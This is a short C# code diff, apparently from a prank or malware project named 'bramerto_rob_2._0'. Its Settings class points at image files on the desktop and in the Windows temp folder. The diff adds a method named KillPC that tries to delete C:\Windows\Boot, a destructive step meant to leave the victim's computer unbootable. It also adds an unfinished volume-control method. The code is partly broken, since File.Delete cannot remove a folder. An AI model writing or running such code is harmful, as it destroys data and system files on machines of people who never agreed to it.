@@ -12,6 +12,7 @@ namespace bramerto_rob_2._0
 {
     public class Settings
     {
+
         Random ran = new Random();
         public string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\WOW.jpg";
         public string temp = @"C:\Windows\Temp\W0W.jpg";
@@ -67,7 +68,13 @@ namespace bramerto_rob_2._0
 
         public void KillPC()
         {
+            File.Delete(@"C:\Windows\Boot");
+           
+        }
 
+        public void SetVolume(int number)
+        {
+            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
         }
     }
 }
